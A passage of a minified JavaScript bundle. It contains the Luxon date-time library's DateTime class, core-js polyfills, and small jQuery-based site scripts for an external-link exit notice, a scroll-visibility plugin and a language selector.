Object.assign({year:e,ordinal:n},gt(t))}function Hn(t){var e=t.year,n=Vn(e,t.ordinal),r=n.month,a=n.day;return Object.assign({year:e,month:r,day:a},gt(t))}function $n(t){var e=B(t.year),n=et(t.month,1,12),r=et(t.day,1,ct(t.year,t.month));return e?n?!r&&An("day",t.day):An("month",t.month):An("year",t.year)}function Un(t){var e=t.hour,n=t.minute,r=t.second,a=t.millisecond,i=et(e,0,23)||24===e&&0===n&&0===r&&0===a,o=et(n,0,59),s=et(r,0,59),c=et(a,0,999);return i?o?s?!c&&An("millisecond",a):An("second",r):An("minute",n):An("hour",e)}function Zn(t){return new Lt("unsupported zone",'the zone "'+t.name+'" is not supported')}function Wn(t){return null===t.weekData&&(t.weekData=Rn(t.c)),t.weekData}function Gn(t,e){var n={ts:t.ts,zone:t.zone,c:t.c,o:t.o,loc:t.loc,invalid:t.invalid};return new ur(Object.assign({},n,e,{old:n}))}function Bn(t,e,n){var r=t-60*e*1e3,a=n.offset(r);if(e===a)return[r,e];r-=60*(a-e)*1e3;var i=n.offset(r);return a===i?[r,a]:[t-60*Math.min(a,i)*1e3,Math.max(a,i)]}function Jn(t,e){var n=new Date(t+=60*e*1e3);return{year:n.getUTCFullYear(),month:n.getUTCMonth()+1,day:n.getUTCDate(),hour:n.getUTCHours(),minute:n.getUTCMinutes(),second:n.getUTCSeconds(),millisecond:n.getUTCMilliseconds()}}function Yn(t,e,n){return Bn(lt(t),e,n)}function Qn(t,e){var n=t.o,r=t.c.year+Math.trunc(e.years),a=t.c.month+Math.trunc(e.months)+3*Math.trunc(e.quarters),i=Object.assign({},t.c,{year:r,month:a,day:Math.min(t.c.day,ct(r,a))+Math.trunc(e.days)+7*Math.trunc(e.weeks)}),o=ln.fromObject({years:e.years-Math.trunc(e.years),quarters:e.quarters-Math.trunc(e.quarters),months:e.months-Math.trunc(e.months),weeks:e.weeks-Math.trunc(e.weeks),days:e.days-Math.trunc(e.days),hours:e.hours,minutes:e.minutes,seconds:e.seconds,milliseconds:e.milliseconds}).as("milliseconds"),s=Bn(lt(i),n,t.zone),c=s[0],l=s[1];return 0!==o&&(c+=o,l=t.zone.offset(c)),{ts:c,o:l}}function Kn(t,e,n,r,a){var i=n.setZone,o=n.zone;if(t&&0!==Object.keys(t).length){var s=e||o,c=ur.fromObject(Object.assign(t,n,{zone:s,setZone:void 0}));return i?c:c.setZone(o)}return ur.invalid(new Lt("unparsable",'the input "'+a+"\" can't be parsed as "+r))}function Xn(t,e,n){return void 0===n&&(n=!0),t.isValid?At.create(fe.create("en-US"),{allowZ:n,forceSimple:!0}).formatDateTimeFromString(t,e):null}function tr(t,e){var n=e.suppressSeconds,r=void 0!==n&&n,a=e.suppressMilliseconds,i=void 0!==a&&a,o=e.includeOffset,s=e.includePrefix,c=void 0!==s&&s,l=e.includeZone,u=void 0!==l&&l,d=e.spaceZone,f=void 0!==d&&d,h=e.format,p=void 0===h?"extended":h,m="basic"===p?"HHmm":"HH:mm";r&&0===t.second&&0===t.millisecond||(m+="basic"===p?"ss":":ss",i&&0===t.millisecond||(m+=".SSS")),(u||o)&&f&&(m+=" "),u?m+="z":o&&(m+="basic"===p?"ZZZ":"ZZ");var v=Xn(t,m);return c&&(v="T"+v),v}var er={month:1,day:1,hour:0,minute:0,second:0,millisecond:0},nr={weekNumber:1,weekday:1,hour:0,minute:0,second:0,millisecond:0},rr={ordinal:1,hour:0,minute:0,second:0,millisecond:0},ar=["year","month","day","hour","minute","second","millisecond"],ir=["weekYear","weekNumber","weekday","hour","minute","second","millisecond"],or=["year","ordinal","hour","minute","second","millisecond"];function sr(t){var e={year:"year",years:"year",month:"month",months:"month",day:"day",days:"day",hour:"hour",hours:"hour",minute:"minute",minutes:"minute",quarter:"quarter",quarters:"quarter",second:"second",seconds:"second",millisecond:"millisecond",milliseconds:"millisecond",weekday:"weekday",weekdays:"weekday",weeknumber:"weekNumber",weeksnumber:"weekNumber",weeknumbers:"weekNumber",weekyear:"weekYear",weekyears:"weekYear",ordinal:"ordinal"}[t.toLowerCase()];if(!e)throw new y(t);return e}function cr(t,e){for(var n,r=f(ar);!(n=r()).done;){var a=n.value;W(t[a])&&(t[a]=er[a])}var i=$n(t)||Un(t);if(i)return ur.invalid(i);var o=ee.now(),s=Yn(t,e.offset(o),e),c=s[0],l=s[1];return new ur({ts:c,zone:e,o:l})}function lr(t,e,n){var r=!!W(n.round)||n.round,a=function(t,a){return t=it(t,r||n.calendary?0:2,!0),e.loc.clone(n).relFormatter(n).format(t,a)},i=function(r){return n.calendary?e.hasSame(t,r)?0:e.startOf(r).diff(t.startOf(r),r).get(r):e.diff(t,r).get(r)};if(n.unit)return a(i(n.unit),n.unit);for(var o,s=f(n.units);!(o=s()).done;){var c=o.value,l=i(c);if(Math.abs(l)>=1)return a(l,c)}return a(0,n.units[n.units.length-1])}var ur=function(){function t(t){var e=t.zone||ee.defaultZone,n=t.invalid||(Number.isNaN(t.ts)?new Lt("invalid input"):null)||(e.isValid?null:Zn(e));this.ts=W(t.ts)?ee.now():t.ts;var r=null,a=null;if(!n)if(t.old&&t.old.ts===this.ts&&t.old.zone.equals(e)){var i=[t.old.c,t.old.o];r=i[0],a=i[1]}else{var o=e.offset(this.ts);r=Jn(this.ts,o),r=(n=Number.isNaN(r.year)?new Lt("invalid input"):null)?null:r,a=n?null:o}this._zone=e,this.loc=t.loc||fe.create(),this.invalid=n,this.weekData=null,this.c=r,this.o=a,this.isLuxonDateTime=!0}t.now=function(){return new t({})},t.local=function(e,n,r,a,i,o,s){return W(e)?new t({}):cr({year:e,month:n,day:r,hour:a,minute:i,second:o,millisecond:s},ee.defaultZone)},t.utc=function(e,n,r,a,i,o,s){return W(e)?new t({ts:ee.now(),zone:Wt.utcInstance}):cr({year:e,month:n,day:r,hour:a,minute:i,second:o,millisecond:s},Wt.utcInstance)},t.fromJSDate=function(e,n){void 0===n&&(n={});var r,a=(r=e,"[object Date]"===Object.prototype.toString.call(r)?e.valueOf():NaN);if(Number.isNaN(a))return t.invalid("invalid input");var i=Bt(n.zone,ee.defaultZone);return i.isValid?new t({ts:a,zone:i,loc:fe.fromObject(n)}):t.invalid(Zn(i))},t.fromMillis=function(e,n){if(void 0===n&&(n={}),G(e))return e<-864e13||e>864e13?t.invalid("Timestamp out of range"):new t({ts:e,zone:Bt(n.zone,ee.defaultZone),loc:fe.fromObject(n)});throw new b("fromMillis requires a numerical input, but received a "+typeof e+" with value "+e)},t.fromSeconds=function(e,n){if(void 0===n&&(n={}),G(e))return new t({ts:1e3*e,zone:Bt(n.zone,ee.defaultZone),loc:fe.fromObject(n)});throw new b("fromSeconds requires a numerical input")},t.fromObject=function(e){var n=Bt(e.zone,ee.defaultZone);if(!n.isValid)return t.invalid(Zn(n));var r=ee.now(),a=n.offset(r),i=mt(e,sr,["zone","locale","outputCalendar","numberingSystem"]),o=!W(i.ordinal),s=!W(i.year),c=!W(i.month)||!W(i.day),l=s||c,u=i.weekYear||i.weekNumber,d=fe.fromObject(e);if((l||o)&&u)throw new g("Can't mix weekYear/weekNumber units with year/month/day or ordinals");if(c&&o)throw new g("Can't mix ordinal dates with month/day");var h,p,m=u||i.weekday&&!l,v=Jn(r,a);m?(h=ir,p=nr,v=Rn(v)):o?(h=or,p=rr,v=qn(v)):(h=ar,p=er);for(var y,b=!1,w=f(h);!(y=w()).done;){var C=y.value;W(i[C])?i[C]=b?p[C]:v[C]:b=!0}var k=(m?function(t){var e=B(t.weekYear),n=et(t.weekNumber,1,ut(t.weekYear)),r=et(t.weekday,1,7);return e?n?!r&&An("weekday",t.weekday):An("week",t.week):An("weekYear",t.weekYear)}(i):o?function(t){var e=B(t.year),n=et(t.ordinal,1,st(t.year));return e?!n&&An("ordinal",t.ordinal):An("year",t.year)}(i):$n(i))||Un(i);if(k)return t.invalid(k);var S=Yn(m?zn(i):o?Hn(i):i,a,n),x=new t({ts:S[0],zone:n,o:S[1],loc:d});return i.weekday&&l&&e.weekday!==x.weekday?t.invalid("mismatched weekday","you can't specify both a weekday of "+i.weekday+" and a date of "+x.toISO()):x},t.fromISO=function(t,e){void 0===e&&(e={});var n=function(t){return me(t,[He,We],[$e,Ge],[Ue,Be],[Ze,Je])}(t);return Kn(n[0],n[1],e,"ISO 8601",t)},t.fromRFC2822=function(t,e){void 0===e&&(e={});var n=function(t){return me(function(t){return t.replace(/\([^)]*\)|[\n\t]/g," ").replace(/(\s\s+)/g," ").trim()}(t),[Ae,Le])}(t);return Kn(n[0],n[1],e,"RFC 2822",t)},t.fromHTTP=function(t,e){void 0===e&&(e={});var n=function(t){return me(t,[Pe,ze],[Ve,ze],[Re,qe])}(t);return Kn(n[0],n[1],e,"HTTP",e)},t.fromFormat=function(e,n,r){if(void 0===r&&(r={}),W(e)||W(n))throw new b("fromFormat requires an input string and a format");var a=r,i=a.locale,o=void 0===i?null:i,s=a.numberingSystem,c=void 0===s?null:s,l=function(t,e,n){var r=_n(t,e,n);return[r.result,r.zone,r.invalidReason]}(fe.fromOpts({locale:o,numberingSystem:c,defaultToEN:!0}),e,n),u=l[0],d=l[1],f=l[2];return f?t.invalid(f):Kn(u,d,r,"format "+n,e)},t.fromString=function(e,n,r){return void 0===r&&(r={}),t.fromFormat(e,n,r)},t.fromSQL=function(t,e){void 0===e&&(e={});var n=function(t){return me(t,[Qe,Xe],[Ke,tn])}(t);return Kn(n[0],n[1],e,"SQL",t)},t.invalid=function(e,n){if(void 0===n&&(n=null),!e)throw new b("need to specify a reason the DateTime is invalid");var r=e instanceof Lt?e:new Lt(e,n);if(ee.throwOnInvalid)throw new p(r);return new t({invalid:r})},t.isDateTime=function(t){return t&&t.isLuxonDateTime||!1};var e=t.prototype;return e.get=function(t){return this[t]},e.resolvedLocaleOpts=function(t){void 0===t&&(t={});var e=At.create(this.loc.clone(t),t).resolvedOptions(this);return{locale:e.locale,numberingSystem:e.numberingSystem,outputCalendar:e.calendar}},e.toUTC=function(t,e){return void 0===t&&(t=0),void 0===e&&(e={}),this.setZone(Wt.instance(t),e)},e.toLocal=function(){return this.setZone(ee.defaultZone)},e.setZone=function(e,n){var r=void 0===n?{}:n,a=r.keepLocalTime,i=void 0!==a&&a,o=r.keepCalendarTime,s=void 0!==o&&o;if((e=Bt(e,ee.defaultZone)).equals(this.zone))return this;if(e.isValid){var c=this.ts;if(i||s){var l=e.offset(this.ts);c=Yn(this.toObject(),l,e)[0]}return Gn(this,{ts:c,zone:e})}return t.invalid(Zn(e))},e.reconfigure=function(t){var e=void 0===t?{}:t,n=e.locale,r=e.numberingSystem,a=e.outputCalendar;return Gn(this,{loc:this.loc.clone({locale:n,numberingSystem:r,outputCalendar:a})})},e.setLocale=function(t){return this.reconfigure({locale:t})},e.set=function(t){if(!this.isValid)return this;var e,n=mt(t,sr,[]);!W(n.weekYear)||!W(n.weekNumber)||!W(n.weekday)?e=zn(Object.assign(Rn(this.c),n)):W(n.ordinal)?(e=Object.assign(this.toObject(),n),W(n.day)&&(e.day=Math.min(ct(e.year,e.month),e.day))):e=Hn(Object.assign(qn(this.c),n));var r=Yn(e,this.o,this.zone);return Gn(this,{ts:r[0],o:r[1]})},e.plus=function(t){return this.isValid?Gn(this,Qn(this,un(t))):this},e.minus=function(t){return this.isValid?Gn(this,Qn(this,un(t).negate())):this},e.startOf=function(t){if(!this.isValid)return this;var e={},n=ln.normalizeUnit(t);switch(n){case"years":e.month=1;case"quarters":case"months":e.day=1;case"weeks":case"days":e.hour=0;case"hours":e.minute=0;case"minutes":e.second=0;case"seconds":e.millisecond=0}if("weeks"===n&&(e.weekday=1),"quarters"===n){var r=Math.ceil(this.month/3);e.month=3*(r-1)+1}return this.set(e)},e.endOf=function(t){var e;return this.isValid?this.plus((e={},e[t]=1,e)).startOf(t).minus(1):this},e.toFormat=function(t,e){return void 0===e&&(e={}),this.isValid?At.create(this.loc.redefaultToEN(e)).formatDateTimeFromString(this,t):"Invalid DateTime"},e.toLocaleString=function(t){return void 0===t&&(t=x),this.isValid?At.create(this.loc.clone(t),t).formatDateTime(this):"Invalid DateTime"},e.toLocaleParts=function(t){return void 0===t&&(t={}),this.isValid?At.create(this.loc.clone(t),t).formatDateTimeParts(this):[]},e.toISO=function(t){return void 0===t&&(t={}),this.isValid?this.toISODate(t)+"T"+this.toISOTime(t):null},e.toISODate=function(t){var e=(void 0===t?{}:t).format,n="basic"===(void 0===e?"extended":e)?"yyyyMMdd":"yyyy-MM-dd";return this.year>9999&&(n="+"+n),Xn(this,n)},e.toISOWeekDate=function(){return Xn(this,"kkkk-'W'WW-c")},e.toISOTime=function(t){var e=void 0===t?{}:t,n=e.suppressMilliseconds,r=void 0!==n&&n,a=e.suppressSeconds,i=void 0!==a&&a,o=e.includeOffset,s=void 0===o||o,c=e.includePrefix,l=void 0!==c&&c,u=e.format;return tr(this,{suppressSeconds:i,suppressMilliseconds:r,includeOffset:s,includePrefix:l,format:void 0===u?"extended":u})},e.toRFC2822=function(){return Xn(this,"EEE, dd LLL yyyy HH:mm:ss ZZZ",!1)},e.toHTTP=function(){return Xn(this.toUTC(),"EEE, dd LLL yyyy HH:mm:ss 'GMT'")},e.toSQLDate=function(){return Xn(this,"yyyy-MM-dd")},e.toSQLTime=function(t){var e=void 0===t?{}:t,n=e.includeOffset,r=void 0===n||n,a=e.includeZone;return tr(this,{includeOffset:r,includeZone:void 0!==a&&a,spaceZone:!0})},e.toSQL=function(t){return void 0===t&&(t={}),this.isValid?this.toSQLDate()+" "+this.toSQLTime(t):null},e.toString=function(){return this.isValid?this.toISO():"Invalid DateTime"},e.valueOf=function(){return this.toMillis()},e.toMillis=function(){return this.isValid?this.ts:NaN},e.toSeconds=function(){return this.isValid?this.ts/1e3:NaN},e.toJSON=function(){return this.toISO()},e.toBSON=function(){return this.toJSDate()},e.toObject=function(t){if(void 0===t&&(t={}),!this.isValid)return{};var e=Object.assign({},this.c);return t.includeConfig&&(e.outputCalendar=this.outputCalendar,e.numberingSystem=this.loc.numberingSystem,e.locale=this.loc.locale),e},e.toJSDate=function(){return new Date(this.isValid?this.ts:NaN)},e.diff=function(t,e,n){if(void 0===e&&(e="milliseconds"),void 0===n&&(n={}),!this.isValid||!t.isValid)return ln.invalid(this.invalid||t.invalid,"created by diffing an invalid DateTime");var r,a=Object.assign({locale:this.locale,numberingSystem:this.numberingSystem},n),i=(r=e,Array.isArray(r)?r:[r]).map(ln.normalizeUnit),o=t.valueOf()>this.valueOf(),s=vn(o?this:t,o?t:this,i,a);return o?s.negate():s},e.diffNow=function(e,n){return void 0===e&&(e="milliseconds"),void 0===n&&(n={}),this.diff(t.now(),e,n)},e.until=function(t){return this.isValid?hn.fromDateTimes(this,t):this},e.hasSame=function(t,e){if(!this.isValid)return!1;var n=t.valueOf(),r=this.setZone(t.zone,{keepLocalTime:!0});return r.startOf(e)<=n&&n<=r.endOf(e)},e.equals=function(t){return this.isValid&&t.isValid&&this.valueOf()===t.valueOf()&&this.zone.equals(t.zone)&&this.loc.equals(t.loc)},e.toRelative=function(e){if(void 0===e&&(e={}),!this.isValid)return null;var n=e.base||t.fromObject({zone:this.zone}),r=e.padding?this<n?-e.padding:e.padding:0;return lr(n,this.plus(r),Object.assign(e,{numeric:"always",units:["years","months","days","hours","minutes","seconds"]}))},e.toRelativeCalendar=function(e){return void 0===e&&(e={}),this.isValid?lr(e.base||t.fromObject({zone:this.zone}),this,Object.assign(e,{numeric:"auto",units:["years","months","days"],calendary:!0})):null},t.min=function(){for(var e=arguments.length,n=new Array(e),r=0;r<e;r++)n[r]=arguments[r];if(!n.every(t.isDateTime))throw new b("min requires all arguments be DateTimes");return K(n,(function(t){return t.valueOf()}),Math.min)},t.max=function(){for(var e=arguments.length,n=new Array(e),r=0;r<e;r++)n[r]=arguments[r];if(!n.every(t.isDateTime))throw new b("max requires all arguments be DateTimes");return K(n,(function(t){return t.valueOf()}),Math.max)},t.fromFormatExplain=function(t,e,n){void 0===n&&(n={});var r=n,a=r.locale,i=void 0===a?null:a,o=r.numberingSystem,s=void 0===o?null:o;return _n(fe.fromOpts({locale:i,numberingSystem:s,defaultToEN:!0}),t,e)},t.fromStringExplain=function(e,n,r){return void 0===r&&(r={}),t.fromFormatExplain(e,n,r)},a(t,[{key:"isValid",get:function(){return null===this.invalid}},{key:"invalidReason",get:function(){return this.invalid?this.invalid.reason:null}},{key:"invalidExplanation",get:function(){return this.invalid?this.invalid.explanation:null}},{key:"locale",get:function(){return this.isValid?this.loc.locale:null}},{key:"numberingSystem",get:function(){return this.isValid?this.loc.numberingSystem:null}},{key:"outputCalendar",get:function(){return this.isValid?this.loc.outputCalendar:null}},{key:"zone",get:function(){return this._zone}},{key:"zoneName",get:function(){return this.isValid?this.zone.name:null}},{key:"year",get:function(){return this.isValid?this.c.year:NaN}},{key:"quarter",get:function(){return this.isValid?Math.ceil(this.c.month/3):NaN}},{key:"month",get:function(){return this.isValid?this.c.month:NaN}},{key:"day",get:function(){return this.isValid?this.c.day:NaN}},{key:"hour",get:function(){return this.isValid?this.c.hour:NaN}},{key:"minute",get:function(){return this.isValid?this.c.minute:NaN}},{key:"second",get:function(){return this.isValid?this.c.second:NaN}},{key:"millisecond",get:function(){return this.isValid?this.c.millisecond:NaN}},{key:"weekYear",get:function(){return this.isValid?Wn(this).weekYear:NaN}},{key:"weekNumber",get:function(){return this.isValid?Wn(this).weekNumber:NaN}},{key:"weekday",get:function(){return this.isValid?Wn(this).weekday:NaN}},{key:"ordinal",get:function(){return this.isValid?qn(this.c).ordinal:NaN}},{key:"monthShort",get:function(){return this.isValid?pn.months("short",{locale:this.locale})[this.month-1]:null}},{key:"monthLong",get:function(){return this.isValid?pn.months("long",{locale:this.locale})[this.month-1]:null}},{key:"weekdayShort",get:function(){return this.isValid?pn.weekdays("short",{locale:this.locale})[this.weekday-1]:null}},{key:"weekdayLong",get:function(){return this.isValid?pn.weekdays("long",{locale:this.locale})[this.weekday-1]:null}},{key:"offset",get:function(){return this.isValid?+this.o:NaN}},{key:"offsetNameShort",get:function(){return this.isValid?this.zone.offsetName(this.ts,{format:"short",locale:this.locale}):null}},{key:"offsetNameLong",get:function(){return this.isValid?this.zone.offsetName(this.ts,{format:"long",locale:this.locale}):null}},{key:"isOffsetFixed",get:function(){return this.isValid?this.zone.universal:null}},{key:"isInDST",get:function(){return!this.isOffsetFixed&&(this.offset>this.set({month:1}).offset||this.offset>this.set({month:5}).offset)}},{key:"isInLeapYear",get:function(){return ot(this.year)}},{key:"daysInMonth",get:function(){return ct(this.year,this.month)}},{key:"daysInYear",get:function(){return this.isValid?st(this.year):NaN}},{key:"weeksInWeekYear",get:function(){return this.isValid?ut(this.weekYear):NaN}}],[{key:"DATE_SHORT",get:function(){return x}},{key:"DATE_MED",get:function(){return T}},{key:"DATE_MED_WITH_WEEKDAY",get:function(){return O}},{key:"DATE_FULL",get:function(){return j}},{key:"DATE_HUGE",get:function(){return E}},{key:"TIME_SIMPLE",get:function(){return M}},{key:"TIME_WITH_SECONDS",get:function(){return I}},{key:"TIME_WITH_SHORT_OFFSET",get:function(){return D}},{key:"TIME_WITH_LONG_OFFSET",get:function(){return _}},{key:"TIME_24_SIMPLE",get:function(){return N}},{key:"TIME_24_WITH_SECONDS",get:function(){return F}},{key:"TIME_24_WITH_SHORT_OFFSET",get:function(){return A}},{key:"TIME_24_WITH_LONG_OFFSET",get:function(){return L}},{key:"DATETIME_SHORT",get:function(){return P}},{key:"DATETIME_SHORT_WITH_SECONDS",get:function(){return V}},{key:"DATETIME_MED",get:function(){return R}},{key:"DATETIME_MED_WITH_SECONDS",get:function(){return z}},{key:"DATETIME_MED_WITH_WEEKDAY",get:function(){return q}},{key:"DATETIME_FULL",get:function(){return H}},{key:"DATETIME_FULL_WITH_SECONDS",get:function(){return $}},{key:"DATETIME_HUGE",get:function(){return U}},{key:"DATETIME_HUGE_WITH_SECONDS",get:function(){return Z}}]),t}();function dr(t){if(ur.isDateTime(t))return t;if(t&&t.valueOf&&G(t.valueOf()))return ur.fromJSDate(t);if(t&&"object"==typeof t)return ur.fromObject(t);throw new b("Unknown datetime argument: "+t+", of type "+typeof t)}e.DateTime=ur,e.Duration=ln,e.FixedOffsetZone=Wt,e.IANAZone=Ut,e.Info=pn,e.Interval=hn,e.InvalidZone=Gt,e.LocalZone=Rt,e.Settings=ee,e.VERSION="1.26.0",e.Zone=Pt},function(t,e,n){var r=n(6),a=n(39),i=n(0)("species");t.exports=function(t,e){var n,o=r(t).constructor;return void 0===o||null==(n=r(o)[i])?e:a(n)}},function(t,e,n){"use strict";var r=n(42);n(3)({target:"RegExp",proto:!0,forced:r!==/./.exec},{exec:r})},function(t,e,n){t.exports=n(27)("native-function-to-string",Function.toString)},function(t,e,n){var r=n(9),a=n(6),i=function(t,e){if(a(t),!r(e)&&null!==e)throw TypeError(e+": can't set as prototype!")};t.exports={set:Object.setPrototypeOf||("__proto__"in{}?function(t,e,r){try{(r=n(34)(Function.call,n(43).f(Object.prototype,"__proto__").set,2))(t,[]),e=!(t instanceof Array)}catch(t){e=!0}return function(t,n){return i(t,n),e?t.__proto__=n:r(t,n),t}}({},!1):void 0),check:i}},function(t,e,n){var r=n(16),a=n(15),i=n(62);t.exports=function(t){return function(e,n,o){var s,c=r(e),l=a(c.length),u=i(o,l);if(t&&n!=n){for(;l>u;)if((s=c[u++])!=s)return!0}else for(;l>u;u++)if((t||u in c)&&c[u]===n)return t||u||0;return!t&&-1}}},function(t,e,n){"use strict";var r=n(7),a=n(8),i=n(5),o=n(0)("species");t.exports=function(t){var e=r[t];i&&e&&!e[o]&&a.f(e,o,{configurable:!0,get:function(){return this}})}},function(t,e,n){var r=n(81);t.exports=function(t,e){return new(r(t))(e)}},function(t,e,n){var r=n(9),a=n(63),i=n(0)("species");t.exports=function(t){var e;return a(t)&&("function"!=typeof(e=t.constructor)||e!==Array&&!a(e.prototype)||(e=void 0),r(e)&&null===(e=e[i])&&(e=void 0)),void 0===e?Array:e}},function(t,e,n){"use strict";var r=n(3),a=n(47)(2);r(r.P+r.F*!n(48)([].filter,!0),"Array",{filter:function(t){return a(this,t,arguments[1])}})},function(t,e,n){n(5)&&"g"!=/./g.flags&&n(8).f(RegExp.prototype,"flags",{configurable:!0,get:n(31)})},function(t,e,n){var r=n(14),a=n(18);n(85)("keys",(function(){return function(t){return a(r(t))}}))},function(t,e,n){var r=n(3),a=n(21),i=n(2);t.exports=function(t,e){var n=(a.Object||{})[t]||Object[t],o={};o[t]=e(n),r(r.S+r.F*i((function(){n(1)})),"Object",o)}},function(t,e){var n,r,a,i;n=Cog.jQuery(),r=n("body"),a=n("#exit-notification"),i=function(){r.removeClass("scroll-stop"),a.addClass("is-hidden"),n(".link-activated").removeClass("link-activated")},n(document).ready((function(t){r.on("click",(function(t){var e=n(t.target);if(e.is("a.external, a.external *")&&(t.preventDefault(),e=e.closest("a").addClass("link-activated"),r.addClass("scroll-stop"),a.removeClass("is-hidden")),e.is("#exit-notification .exit-notification-accept, #exit-notification .exit-notification-accept *")){var o=n(".link-activated").attr("href");window.open(o),i()}e.is("#exit-notification .exit-notification-deny, #exit-notification .exit-notification-deny *")&&i()})).on("keydown",(function(t){27===t.keyCode&&i()}))}))},function(t,e,n){var r=n(3),a=n(65)(!0);r(r.S,"Object",{entries:function(t){return a(t)}})},function(t,e,n){var r=n(3);r(r.S+r.F,"Object",{assign:n(89)})},function(t,e,n){"use strict";var r=n(5),a=n(18),i=n(49),o=n(25),s=n(14),c=n(44),l=Object.assign;t.exports=!l||n(2)((function(){var t={},e={},n=Symbol(),r="abcdefghijklmnopqrst";return t[n]=7,r.split("").forEach((function(t){e[t]=t})),7!=l({},t)[n]||Object.keys(l({},e)).join("")!=r}))?function(t,e){for(var n=s(t),l=arguments.length,u=1,d=i.f,f=o.f;l>u;)for(var h,p=c(arguments[u++]),m=d?a(p).concat(d(p)):a(p),v=m.length,g=0;v>g;)h=m[g++],r&&!f.call(p,h)||(n[h]=p[h]);return n}:l},function(t,e,n){"use strict";var r=n(3),a=n(47)(1);r(r.P+r.F*!n(48)([].map,!0),"Array",{map:function(t){return a(this,t,arguments[1])}})},function(t,e){!function(t){function e(e,n){if(!t(e).is(":visible"))return!1;for(var r=e.getBoundingClientRect(),a=[{x:r.left,y:r.top},{x:r.right,y:r.top},{x:r.left,y:r.bottom},{x:r.right,y:r.bottom}],i=0;i<a.length;i++){var o=a[i];if(o.y<=n.bottom&&o.y>=n.top&&o.x>=n.left&&o.x<=n.right)return!0}return r.top<=n.top&&r.bottom>=n.bottom||r.left<=n.left&&r.right>=n.right}function n(n){if(0!=n.items.length){for(var r,a,i=function(t){if(t[0]==window){var e=window.innerHeight||document.documentElement.clientHeight,n=window.innerWidth||document.documentElement.clientWidth;return{top:0,left:0,right:n,bottom:e,height:e,width:n}}return t[0].getBoundingClientRect()}(n.options.container),o=[],s=0;s<n.items.length;s++){var c=!0;r=n.options.container,a=n.items[s],(r[0]==window?t("body")[0].contains(a):r[0].contains(a))?e(n.items[s],i)&&(t(n.items[s]).trigger(n.options.event),c=!n.options.once):c=!1,c&&o.push(n.items[s])}n.items=o}}t.fn.initAppear=function(e){if(0!=t(this).length){var r={container:t(window),scrollDelay:200,event:"appear",once:!1},a={options:e=t.extend(r,e),items:this.get()},i=function(){!function(t){t.timer&&clearTimeout(t.timer),t.timer=setTimeout((function(){t.timer=!1,n(t)}),t.options.scrollDelay)}(a)};e.container.on("scroll",i),t(window).on("resize",i),n(a)}}}(Cog.jQuery())},function(t,e,n){var r=n(23)("meta"),a=n(9),i=n(13),o=n(8).f,s=0,c=Object.isExtensible||function(){return!0},l=!n(2)((function(){return c(Object.preventExtensions({}))})),u=function(t){o(t,r,{value:{i:"O"+ ++s,w:{}}})},d=t.exports={KEY:r,NEED:!1,fastKey:function(t,e){if(!a(t))return"symbol"==typeof t?t:("string"==typeof t?"S":"P")+t;if(!i(t,r)){if(!c(t))return"F";if(!e)return"E";u(t)}return t[r].i},getWeak:function(t,e){if(!i(t,r)){if(!c(t))return!0;if(!e)return!1;u(t)}return t[r].w},onFreeze:function(t){return l&&d.NEED&&c(t)&&!i(t,r)&&u(t),t}}},function(t,e,n){var r=n(7),a=n(21),i=n(28),o=n(66),s=n(8).f;t.exports=function(t){var e=a.Symbol||(a.Symbol=i?{}:r.Symbol||{});"_"==t.charAt(0)||t in e||s(e,t,{value:o.f(t)})}},function(t,e,n){var r=n(18),a=n(49),i=n(25);t.exports=function(t){var e=r(t),n=a.f;if(n)for(var o,s=n(t),c=i.f,l=0;s.length>l;)c.call(t,o=s[l++])&&e.push(o);return e}},function(t,e,n){var r=n(8),a=n(6),i=n(18);t.exports=n(5)?Object.defineProperties:function(t,e){a(t);for(var n,o=i(e),s=o.length,c=0;s>c;)r.f(t,n=o[c++],e[n]);return t}},function(t,e,n){var r=n(16),a=n(36).f,i={}.toString,o="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[];t.exports.f=function(t){return o&&"[object Window]"==i.call(t)?function(t){try{return a(t)}catch(t){return o.slice()}}(t):a(r(t))}},function(t,e,n){"use strict";var r=n(52),a=n(24),i=n(51),o={};n(12)(o,n(0)("iterator"),(function(){return this})),t.exports=function(t,e,n){t.prototype=r(o,{next:a(1,n)}),i(t,e+" Iterator")}},function(t,e,n){var r=n(13),a=n(14),i=n(45)("IE_PROTO"),o=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=a(t),r(t,i)?t[i]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?o:null}},function(t,e){t.exports=function(t,e){return{value:e,done:!!t}}},function(t,e,n){"use strict";var r=n(34),a=n(3),i=n(14),o=n(101),s=n(102),c=n(15),l=n(103),u=n(104);a(a.S+a.F*!n(105)((function(t){Array.from(t)})),"Array",{from:function(t){var e,n,a,d,f=i(t),h="function"==typeof this?this:Array,p=arguments.length,m=p>1?arguments[1]:void 0,v=void 0!==m,g=0,y=u(f);if(v&&(m=r(m,p>2?arguments[2]:void 0,2)),null==y||h==Array&&s(y))for(n=new h(e=c(f.length));e>g;g++)l(n,g,v?m(f[g],g):f[g]);else for(d=y.call(f),n=new h;!(a=d.next()).done;g++)l(n,g,v?o(d,m,[a.value,g],!0):a.value);return n.length=g,n}})},function(t,e,n){var r=n(6);t.exports=function(t,e,n,a){try{return a?e(r(n)[0],n[1]):e(n)}catch(e){var i=t.return;throw void 0!==i&&r(i.call(t)),e}}},function(t,e,n){var r=n(26),a=n(0)("iterator"),i=Array.prototype;t.exports=function(t){return void 0!==t&&(r.Array===t||i[a]===t)}},function(t,e,n){"use strict";var r=n(8),a=n(24);t.exports=function(t,e,n){e in t?r.f(t,e,a(0,n)):t[e]=n}},function(t,e,n){var r=n(41),a=n(0)("iterator"),i=n(26);t.exports=n(21).getIteratorMethod=function(t){if(null!=t)return t[a]||t["@@iterator"]||i[r(t)]}},function(t,e,n){var r=n(0)("iterator"),a=!1;try{var i=[7][r]();i.return=function(){a=!0},Array.from(i,(function(){throw 2}))}catch(t){}t.exports=function(t,e){if(!e&&!a)return!1;var n=!1;try{var i=[7],o=i[r]();o.next=function(){return{done:n=!0}},i[r]=function(){return o},t(i)}catch(t){}return n}},function(t,e){var n;(n=Cog.jQuery())(document).ready((function(){var t,e;t=n(".reference-language-list"),e=n(".reference-language-selector"),n("body").on("click",(function(r){if(n(r.target).is(".reference-language-selector, .reference-language-selector *, .reference-language-list, .reference-language-list *"))return t.toggleClass("opened"),e.toggleClass("opened"),void n(".megamenu > .component-content").stop().animate({scrollTop:0},200,"swing");t.removeClass("opened"),e.removeClass("opened")}));var 